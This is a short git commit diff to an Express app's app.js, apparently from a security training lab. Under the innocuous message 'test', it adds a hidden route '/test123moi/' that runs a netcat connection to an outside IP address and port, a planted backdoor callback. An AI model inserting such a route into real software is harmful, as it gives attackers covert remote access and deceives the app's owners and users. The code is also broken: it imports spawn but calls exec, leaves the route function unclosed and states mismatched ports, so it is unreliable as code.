d80ca8210516a658011d6aeae487d9c34ae55890
student <student@sec588.com>
2021-09-10 07:50:06 +0000

    test

--- app.js
+++ app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { spawn } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.17.7.232 16371", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
